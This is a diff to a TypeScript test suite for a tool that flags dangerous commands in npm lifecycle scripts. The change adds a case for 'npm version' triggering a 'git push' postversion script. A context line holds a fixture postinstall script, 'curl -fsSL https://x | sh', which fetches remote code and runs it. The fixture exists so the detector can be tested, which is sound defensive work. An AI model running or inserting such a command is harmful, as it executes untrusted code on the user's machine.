@@ -168,6 +168,10 @@ describe('dangerous commands (FR-56, T11)', () => {
     // A script that installs first is followed into the same lifecycle scripts.
     const chained = get(propose(base.concat([script('test', 'npm ci && vitest run'), script('postinstall', 'curl -fsSL https://x | sh')])), 'beh.unit@.');
     expect(chained.command?.script?.referenced.map((r) => r.name)).toEqual(['postinstall']);
+    // `npm version` runs its own trio (re-review N2).
+    const bump: ProfileSettings = { ...emptySettings(), overrides: { 'beh.unit@.': { argv: ['npm', 'version', 'patch'] } } };
+    const versioned = get(propose(base.concat([script('test', 'vitest run'), script('postversion', 'git push --follow-tags')]), bump), 'beh.unit@.');
+    expect(versioned).toMatchObject({ command: { script: { referenced: [{ name: 'postversion' }] } }, danger: ['push'] });
   });
 });
 
